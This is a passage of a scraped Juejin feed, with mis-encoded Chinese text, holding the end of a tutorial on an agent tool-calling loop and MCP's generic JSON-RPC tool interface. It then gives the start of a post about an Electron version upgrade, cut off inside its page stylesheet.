  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
               â”‚
               â–¼
        è¿”å›ç”¨æˆ·: <span class="hljs-string">"ç­”æ¡ˆæ˜¯ 30"</span>
</code></pre>
<h4 data-id="heading-9">3.3 å¾ªç¯æœºåˆ¶çš„å…³é”®</h4>
<p>Agent çš„å¾ªç¯å¤„ç†æ˜¯ç†è§£æ•´ä¸ªæ¶æ„çš„å…³é”®ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">async</span> <span class="hljs-title function_">process</span>(<span class="hljs-attr">userInput</span>: <span class="hljs-built_in">string</span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">string</span>&gt; {
  <span class="hljs-keyword">let</span> messages = [{ <span class="hljs-attr">role</span>: <span class="hljs-string">"user"</span>, <span class="hljs-attr">content</span>: userInput }]
  
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> iteration = <span class="hljs-number">0</span>; iteration &lt; maxIterations; iteration++) {
    <span class="hljs-comment">// 1. è°ƒç”¨ Claude</span>
    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> claude.<span class="hljs-property">messages</span>.<span class="hljs-title function_">create</span>({
      messages,
      <span class="hljs-attr">tools</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">tools</span>  <span class="hljs-comment">// ä¼ é€’æ‰€æœ‰å¯ç”¨å·¥å…·</span>
    })
    
    <span class="hljs-comment">// 2. æ·»åŠ  Claude çš„å“åº”åˆ°å†å²</span>
    messages.<span class="hljs-title function_">push</span>({ <span class="hljs-attr">role</span>: <span class="hljs-string">"assistant"</span>, <span class="hljs-attr">content</span>: response.<span class="hljs-property">content</span> })
    
    <span class="hljs-comment">// 3. æ£€æŸ¥ Claude æ˜¯å¦å®Œæˆ</span>
    <span class="hljs-keyword">if</span> (response.<span class="hljs-property">stop_reason</span> === <span class="hljs-string">"end_turn"</span>) {
      <span class="hljs-comment">// Claude å®Œæˆäº†ï¼Œè¿”å›æœ€ç»ˆç­”æ¡ˆ</span>
      <span class="hljs-keyword">const</span> textBlock = response.<span class="hljs-property">content</span>.<span class="hljs-title function_">find</span>(<span class="hljs-function"><span class="hljs-params">b</span> =&gt;</span> b.<span class="hljs-property">type</span> === <span class="hljs-string">"text"</span>)
      <span class="hljs-keyword">return</span> textBlock.<span class="hljs-property">text</span>
    }
    
    <span class="hljs-comment">// 4. Claude è¦æ±‚è°ƒç”¨å·¥å…·</span>
    <span class="hljs-keyword">if</span> (response.<span class="hljs-property">stop_reason</span> === <span class="hljs-string">"tool_use"</span>) {

      <span class="hljs-keyword">const</span> toolResults = [ ]

      
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> block <span class="hljs-keyword">of</span> response.<span class="hljs-property">content</span>) {
        <span class="hljs-keyword">if</span> (block.<span class="hljs-property">type</span> === <span class="hljs-string">"tool_use"</span>) {
          <span class="hljs-comment">// é€šè¿‡ MCP è°ƒç”¨å·¥å…·</span>
          <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">callToolViaMCP</span>(
            block.<span class="hljs-property">name</span>,
            block.<span class="hljs-property">input</span>
          )
          
          toolResults.<span class="hljs-title function_">push</span>({
            <span class="hljs-attr">type</span>: <span class="hljs-string">"tool_result"</span>,
            <span class="hljs-attr">tool_use_id</span>: block.<span class="hljs-property">id</span>,
            <span class="hljs-attr">content</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(result)
          })
        }
      }
      
      <span class="hljs-comment">// 5. æŠŠå·¥å…·ç»“æœæ·»åŠ åˆ°å†å²ï¼ˆå…³é”®ï¼Claude éœ€è¦çœ‹åˆ°ç»“æœï¼‰</span>
      messages.<span class="hljs-title function_">push</span>({
        <span class="hljs-attr">role</span>: <span class="hljs-string">"user"</span>,
        <span class="hljs-attr">content</span>: toolResults
      })
      
      <span class="hljs-comment">// å¾ªç¯å›ç¬¬ 1 æ­¥ï¼ŒClaude åŸºäºå·¥å…·ç»“æœç»§ç»­æ¨ç†</span>
    }
  }
}
</code></pre>
<p>å…³é”®ç‚¹ï¼š</p>
<ul>
<li><code>messages</code> æ•°ç»„æ˜¯"è®°å¿†"ï¼Œä¸æ–­ç§¯ç´¯</li>
<li>æ¯æ¬¡è°ƒç”¨ Claude æ—¶ï¼Œéƒ½ä¼ é€’å®Œæ•´çš„å†å²</li>
<li>Claude åŸºäºä¹‹å‰çš„å·¥å…·æ‰§è¡Œç»“æœè¿›è¡Œä¸‹ä¸€æ­¥å†³ç­–</li>
</ul>
<hr/>
<h3 data-id="heading-10">å››ã€MCP çš„æ³›åŒ–è°ƒç”¨è®¾è®¡</h3>
<h4 data-id="heading-11">4.1 ä¸ºä»€ä¹ˆéœ€è¦æ³›åŒ–ï¼Ÿ</h4>
<p>ä¸æ³›åŒ–çš„æ–¹å¼ï¼ˆæ··ä¹±ï¼‰ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">// éœ€è¦ä¸ºæ¯ä¸ªå·¥å…·å†™ç‰¹å®šä»£ç 
if (<span class="hljs-attr">toolName</span> === <span class="hljs-string">"add"</span>) {
  <span class="hljs-attr">result</span> = calculator.add(args.a, args.b)
} else if (<span class="hljs-attr">toolName</span> === <span class="hljs-string">"query"</span>) {
  <span class="hljs-attr">result</span> = database.query(args.sql)
} else if (<span class="hljs-attr">toolName</span> === <span class="hljs-string">"analyzeCode"</span>) {
  <span class="hljs-attr">result</span> = codeAnalyzer.analyze(args.code)
}
// ... 100+ ä¸ª else if ...

// é—®é¢˜ï¼šæ–°å¢å·¥å…·æ—¶è¦æ”¹åº”ç”¨ä»£ç 
</code></pre>
<p>æ³›åŒ–çš„æ–¹å¼ï¼ˆMCPï¼‰ï¼š</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// ä¸€ä¸ªå‡½æ•°æå®šæ‰€æœ‰å·¥å…·</span>
<span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> <span class="hljs-keyword">this</span>.callToolViaMCP(toolName, args)

<span class="hljs-comment">// é—®é¢˜è§£å†³ï¼šæ–°å¢å·¥å…·æ—¶åªéœ€æ”¹é…ç½®</span>
</code></pre>
<h4 data-id="heading-12">4.2 æ³›åŒ–çš„å®ç°åŸç†</h4>
<pre><code class="hljs language-scss" lang="scss">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚   ç»Ÿä¸€çš„å·¥å…·è°ƒç”¨æ¥å£                      â”‚
â”‚   <span class="hljs-built_in">callTool</span>(name: string, args: any)      â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
               â”‚
      â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”
      â”‚                 â”‚
      â–¼                 â–¼
  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”      â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
  â”‚ Server â”‚      â”‚ Server   â”‚
  â”‚ <span class="hljs-selector-tag">A</span>      â”‚      â”‚ <span class="hljs-selector-tag">B</span>        â”‚
  â”‚        â”‚      â”‚          â”‚
  â”‚ add    â”‚      â”‚ query    â”‚
  â”‚ sub    â”‚      â”‚ insert   â”‚
  â””â”€â”€â”€â”€â”€â”€â”€â”€â”˜      â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

æ‰€æœ‰ Server éµå®ˆç›¸åŒçš„ MCP è§„èŒƒï¼š
  â”œâ”€ éƒ½æ”¯æŒ <span class="hljs-built_in">listTools</span>() æ–¹æ³•
  â”œâ”€ éƒ½æ”¯æŒ <span class="hljs-built_in">callTool</span>(name, args) è°ƒç”¨
  â”œâ”€ éƒ½è¿”å›æ ‡å‡†æ ¼å¼çš„ç»“æœ
  â””â”€ åº”ç”¨æ— éœ€å…³å¿ƒ Server å·®å¼‚
</code></pre>
<h4 data-id="heading-13">4.3 MCP è§„èŒƒçš„çº¦æŸ</h4>
<p>MCP å®šä¹‰äº†ç»Ÿä¸€çš„æ¶ˆæ¯æ ¼å¼ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-comment">// å·¥å…·åˆ—è¡¨è¯·æ±‚</span>
<span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"jsonrpc"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"2.0"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"1"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"method"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"tools/list"</span>
<span class="hljs-punctuation">}</span>

<span class="hljs-comment">// å·¥å…·åˆ—è¡¨å“åº”</span>
<span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"jsonrpc"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"2.0"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"1"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"result"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"tools"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
      <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"add"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"description"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Add two numbers"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"inputSchema"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
          <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"object"</span><span class="hljs-punctuation">,</span>
          <span class="hljs-attr">"properties"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
            <span class="hljs-attr">"a"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span><span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"number"</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
            <span class="hljs-attr">"b"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span><span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"number"</span><span class="hljs-punctuation">}</span>
          <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
          <span class="hljs-attr">"required"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"a"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"b"</span><span class="hljs-punctuation">]</span>
        <span class="hljs-punctuation">}</span>
      <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">]</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>

<span class="hljs-comment">// å·¥å…·è°ƒç”¨è¯·æ±‚</span>
<span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"jsonrpc"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"2.0"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"2"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"method"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"tools/call"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"params"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"add"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"arguments"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span><span class="hljs-attr">"a"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">5</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"b"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">3</span><span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>

<span class="hljs-comment">// å·¥å…·è°ƒç”¨å“åº”</span>
<span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"jsonrpc"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"2.0"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"2"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"result"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"content"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
      <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"text"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"text"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"5 + 3 = 8"</span>
      <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">]</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h2 data-id="heading-14">å››ã€ç»“å°¾</h2>
<p>å› æ­¤æœ‰äº†å¯¹è¿™ä¸‰è€…çš„æ ¸å¿ƒæ¦‚å¿µçš„äº†è§£ï¼Œå…¶å®å¯¹å¤§æ¨¡å‹åº”ç”¨å¼€å‘ä¹Ÿæœ‰äº†æ¯”è¾ƒæ·±å…¥çš„è®¤è¯†äº†ã€‚</p>
<p>è¯„è®ºåŒºæ¬¢è¿è®¨è®ºã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å•Šï¼Ÿæˆ‘åˆšæŠŠ Electron ç‰ˆæœ¬å‡çº§åˆ°39ï¼Œç°åœ¨40åˆæ¥äº†â“â“â“]]></title>    <link>https://juejin.cn/post/7596983314805882930</link>    <guid>https://juejin.cn/post/7596983314805882930</guid>    <pubDate>2026-01-20T01:39:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596983314805882930" data-draft-id="7596906473307275314" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å•Šï¼Ÿæˆ‘åˆšæŠŠ Electron ç‰ˆæœ¬å‡çº§åˆ°39ï¼Œç°åœ¨40åˆæ¥äº†â“â“â“"/> <meta itemprop="keywords" content="å‰ç«¯,åç«¯,JavaScript"/> <meta itemprop="datePublished" content="2026-01-20T01:39:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Moment"/> <meta itemprop="url" content="https://juejin.cn/user/3782764966460398"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å•Šï¼Ÿæˆ‘åˆšæŠŠ Electron ç‰ˆæœ¬å‡çº§åˆ°39ï¼Œç°åœ¨40åˆæ¥äº†â“â“â“
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3782764966460398/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Moment
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T01:39:59.000Z" title="Tue Jan 20 2026 01:39:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»11åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"ã€Œ";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"ã€";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"Â»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list 